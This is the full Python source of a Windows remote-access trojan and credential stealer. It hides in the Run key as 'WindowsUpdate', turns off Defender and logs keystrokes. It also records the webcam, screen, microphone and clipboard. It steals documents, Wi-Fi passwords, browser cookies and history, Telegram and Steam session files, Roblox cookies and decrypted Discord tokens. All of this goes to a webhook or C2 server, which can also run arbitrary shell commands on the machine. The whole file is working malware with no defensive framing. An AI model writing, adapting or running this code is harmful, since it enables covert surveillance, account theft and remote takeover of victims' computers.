import os, sys, json, base64, urllib.request, re, ctypes, subprocess, time, threading, shutil, fnmatch, zipfile, sqlite3, winreg, platform, getpass, tempfile, hashlib
from datetime import datetime
from pathlib import Path
import requests
from Crypto.Cipher import AES
from PIL import ImageGrab
import pyaudio, wave, cv2, win32crypt, psutil

if os.name != "nt":
    sys.exit(0)

CONFIG = {}

LOCAL = os.getenv("LOCALAPPDATA", "")
ROAMING = os.getenv("APPDATA", "")
TEMP = os.getenv("TEMP", "")
USERNAME = os.getenv("USERNAME", "")
COMPUTER = os.environ.get("COMPUTERNAME", "unknown")
VICTIM_ID = f"{COMPUTER}_{USERNAME}"

def exfiltrate(data, filename=None):
    if CONFIG.get("webhook"):
        try:
            if filename:
                requests.post(CONFIG["webhook"], files={"file": (filename, open(filename, "rb"))}, timeout=10)
            else:
                requests.post(CONFIG["webhook"], json={"content": data}, timeout=10)
        except:
            pass

def send_to_c2(endpoint, data):
    try:
        url = f"{CONFIG['c2_url']}/{endpoint}"
        headers = {"User-Agent": "Mozilla/5.0", "X-Victim": VICTIM_ID}
        requests.post(url, json=data, headers=headers, timeout=10)
    except:
        pass

def get_system_info():
    return {
        "user": USERNAME,
        "computer": COMPUTER,
        "os": platform.platform(),
        "cpu": platform.processor(),
        "ram": str(round(psutil.virtual_memory().total / (1024**3), 2)) + " GB",
        "ip": requests.get("https://api.ipify.org", timeout=5).text,
        "timestamp": datetime.now().isoformat()
    }

def add_persistence():
    if not CONFIG.get("persist"):
        return
    try:
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
            winreg.SetValueEx(regkey, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
    except:
        pass

def disable_defender():
    if not CONFIG.get("disable_defender"):
        return
    cmds = ["Set-MpPreference -DisableRealtimeMonitoring $true", "Set-MpPreference -DisableBehaviorMonitoring $true", "Set-MpPreference -DisableBlockAtFirstSeen $true", "Set-MpPreference -DisableIOAVProtection $true", "Set-MpPreference -DisablePrivacyMode $true", "Set-MpPreference -SignatureDisableUpdate $true", "Add-MpPreference -ExclusionPath \"C:\\\""]
    for cmd in cmds:
        subprocess.run(["powershell", "-WindowStyle", "Hidden", cmd], capture_output=True)

def keylogger():
    if not CONFIG.get("keylog"):
        return
    from ctypes import *
    from ctypes.wintypes import *
    WH_KEYBOARD_LL = 13
    WM_KEYDOWN = 0x0100
    log_file = os.path.expandvars("%APPDATA%\\keys.log")
    def hook_proc(nCode, wParam, lParam):
        if wParam == WM_KEYDOWN:
            with open(log_file, "a") as f:
                f.write(chr(lParam[0]))
            if os.path.getsize(log_file) > 500:
                exfiltrate(open(log_file).read())
                open(log_file, "w").close()
        return CallNextHookEx(None, nCode, wParam, lParam)
    hook = SetWindowsHookExW(WH_KEYBOARD_LL, hook_proc, None, 0)
    msg = MSG()
    while GetMessageW(byref(msg), None, 0, 0):
        TranslateMessage(byref(msg))
        DispatchMessageW(byref(msg))

def webcam_capture():
    if not CONFIG.get("webcam"):
        return
    try:
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        if ret:
            cv2.imwrite("webcam.jpg", frame)
            exfiltrate(None, "webcam.jpg")
        cam.release()
    except:
        pass

def take_screenshot():
    if not CONFIG.get("screenshot"):
        return
    img = ImageGrab.grab()
    img.save("screenshot.png")
    exfiltrate(None, "screenshot.png")

def screen_recording():
    if not CONFIG.get("screenrec"):
        return
    duration = CONFIG.get("record_seconds", 30)
    import pyautogui, numpy as np
    size = pyautogui.size()
    fourcc = cv2.VideoWriter_fourcc(*"XVID")
    out = cv2.VideoWriter("recording.avi", fourcc, 20.0, size)
    start = time.time()
    while time.time() - start < duration:
        frame = np.array(pyautogui.screenshot())
        frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        out.write(frame)
        time.sleep(0.05)
    out.release()
    exfiltrate(None, "recording.avi")

def mic_recording():
    if not CONFIG.get("mic"):
        return
    duration = CONFIG.get("record_seconds", 30)
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 44100
    p = pyaudio.PyAudio()
    stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
    frames = [stream.read(CHUNK) for _ in range(0, int(RATE / CHUNK * duration))]
    stream.stop_stream()
    stream.close()
    p.terminate()
    with wave.open("mic.wav", 'wb') as wf:
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
    exfiltrate(None, "mic.wav")

def search_and_exfil():
    if not CONFIG.get("file_search"):
        return
    exts = CONFIG.get("file_exts", ".txt,.doc,.pdf").split(",")
    max_size = CONFIG.get("max_file_size_mb", 10) * 1024 * 1024
    found = []
    for root, _, files in os.walk("C:\\Users"):
        for ext in exts:
            for f in fnmatch.filter(files, "*"+ext):
                full = os.path.join(root, f)
                if os.path.getsize(full) <= max_size:
                    found.append(full)
    if found:
        zip_name = "stolen_files.zip"
        with zipfile.ZipFile(zip_name, 'w') as zf:
            for f in found[:50]:
                zf.write(f, os.path.basename(f))
        exfiltrate(None, zip_name)

def steal_wifi():
    if not CONFIG.get("wifi"):
        return
    try:
        results = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True).stdout
        profiles = re.findall(r"All User Profile\s*:\s(.*)", results)
        wifi_data = []
        for p in profiles:
            data = subprocess.run(["netsh", "wlan", "show", "profile", p, "key=clear"], capture_output=True, text=True).stdout
            key = re.search(r"Key Content\s*:\s(.*)", data)
            wifi_data.append({"ssid": p, "password": key.group(1) if key else None})
        exfiltrate(json.dumps(wifi_data, indent=2))
    except:
        pass

def clipboard_logger():
    if not CONFIG.get("clipboard"):
        return
    import win32clipboard
    last = ""
    while True:
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            if data and data != last:
                last = data
                exfiltrate(f"Clipboard: {data}")
        except:
            pass
        time.sleep(2)

def browser_history():
    if not CONFIG.get("history"):
        return
    history_path = LOCAL + "\\Google\\Chrome\\User Data\\Default\\History"
    if os.path.exists(history_path):
        shutil.copy2(history_path, "history.db")
        exfiltrate(None, "history.db")

def steal_telegram():
    if not CONFIG.get("telegram"):
        return
    tdata = ROAMING + "\\Telegram Desktop\\tdata"
    if os.path.exists(tdata):
        shutil.make_archive("telegram", "zip", tdata)
        exfiltrate(None, "telegram.zip")

def steal_steam():
    if not CONFIG.get("steam"):
        return
    for f in Path(ROAMING).glob("**/ssfn*"):
        exfiltrate(None, str(f))

def discord_tokens_cookies_roblox():
    if not CONFIG.get("tokens"):
        return
    PATHS = {
        'Discord': ROAMING + '\\discord',
        'Discord Canary': ROAMING + '\\discordcanary',
        'Discord PTB': ROAMING + '\\discordptb',
        'Chrome': LOCAL + "\\Google\\Chrome\\User Data\\Default",
        'Edge': LOCAL + '\\Microsoft\\Edge\\User Data\\Default',
        'Brave': LOCAL + '\\BraveSoftware\\Brave-Browser\\User Data\\Default'
    }
    checked = []
    results = {"tokens": []}
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        try:
            with open(path + "\\Local State", "r") as f:
                key = json.load(f)['os_crypt']['encrypted_key']
        except:
            continue
        ldb_path = path + "\\Local Storage\\leveldb\\"
        if not os.path.exists(ldb_path):
            continue
        for file in os.listdir(ldb_path):
            if not file.endswith((".ldb", ".log")):
                continue
            with open(ldb_path + file, "r", errors="ignore") as f:
                content = f.read()
                for match in re.findall(r"dQw4w9WgXcQ:[^\"\\s]*", content):
                    try:
                        enc = base64.b64decode(match.split(':')[1])
                        dec_key = win32crypt.CryptUnprotectData(base64.b64decode(key)[5:], None, None, None, 0)[1]
                        cipher = AES.new(dec_key, AES.MODE_GCM, enc[3:15])
                        token = cipher.decrypt(enc[15:])[:-16].decode()
                        if token and token not in checked:
                            checked.append(token)
                            req = requests.get('https://discord.com/api/v10/users/@me', headers={"Authorization": token})
                            if req.status_code == 200:
                                user = req.json()
                                results["tokens"].append({"token": token, "username": user.get("username"), "id": user.get("id"), "email": user.get("email")})
                    except:
                        pass
    if results["tokens"]:
        exfiltrate(json.dumps(results, indent=2))
    cookie_path = LOCAL + "\\Google\\Chrome\\User Data\\Default\\Cookies"
    if os.path.exists(cookie_path):
        shutil.copy2(cookie_path, "cookies.db")
        exfiltrate(None, "cookies.db")
    for f in Path(LOCAL).glob("Roblox\\LocalStorage\\*.json"):
        with open(f, "r") as rf:
            if ".ROBLOSECURITY" in rf.read():
                exfiltrate(None, str(f))

def heartbeat():
    while True:
        send_to_c2("heartbeat", {"victim_id": VICTIM_ID, "last_seen": datetime.now().isoformat()})
        time.sleep(60)

def command_poller():
    last_cmd_id = 0
    while True:
        try:
            resp = requests.get(f"{CONFIG['c2_url']}/poll/{VICTIM_ID}", timeout=30)
            if resp.status_code == 200:
                cmd = resp.json()
                if cmd.get("id") and cmd["id"] > last_cmd_id:
                    last_cmd_id = cmd["id"]
                    command = cmd["command"]
                    if command.lower() == "exit":
                        break
                    elif command.lower().startswith("download "):
                        filepath = command[9:]
                        if os.path.exists(filepath):
                            files = {"file": open(filepath, "rb")}
                            requests.post(f"{CONFIG['c2_url']}/upload/{VICTIM_ID}", files=files)
                    else:
                        output = subprocess.run(command, shell=True, capture_output=True, text=True)
                        requests.post(f"{CONFIG['c2_url']}/result/{VICTIM_ID}", json={"cmd_id": cmd["id"], "output": output.stdout + output.stderr})
            time.sleep(CONFIG.get("poll_interval", 30))
        except:
            time.sleep(30)

def run_threaded(target):
    t = threading.Thread(target=target, daemon=True)
    t.start()

def main():
    add_persistence()
    disable_defender()
    send_to_c2("register", get_system_info())
    run_threaded(heartbeat)
    run_threaded(keylogger)
    run_threaded(webcam_capture)
    take_screenshot()
    run_threaded(screen_recording)
    run_threaded(mic_recording)
    search_and_exfil()
    steal_wifi()
    run_threaded(clipboard_logger)
    browser_history()
    steal_telegram()
    steal_steam()
    discord_tokens_cookies_roblox()
    run_threaded(command_poller)
    while True:
        time.sleep(60)

if __name__ == "__main__":
    try:
        main()
    except:
        pass
